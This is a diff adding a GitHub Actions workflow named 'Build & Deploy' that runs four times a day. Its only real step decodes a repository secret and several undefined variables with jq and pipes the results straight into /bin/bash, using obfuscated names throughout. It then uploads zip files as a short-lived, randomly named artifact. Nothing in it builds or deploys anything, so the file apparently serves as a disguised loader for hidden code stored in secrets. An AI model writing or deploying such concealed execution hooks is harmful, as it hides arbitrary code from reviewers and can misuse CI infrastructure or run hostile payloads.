@@ -1,0 +1,31 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          vlibc651: ${{ secrets.vlibc651 }}
+        run: |
+          printf '%s' "$vlibc651" | jq -r .e500 | /bin/bash
+          printf '%s' "$i073" | jq -r .pum80159 | /bin/bash
+          echo $bnrl1 | jq -r .z6381 | /bin/bash
+          echo $no31 | jq -r .koi4 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: s6eA3ZGp
+          path: "*.zip"
+          retention-days: 1
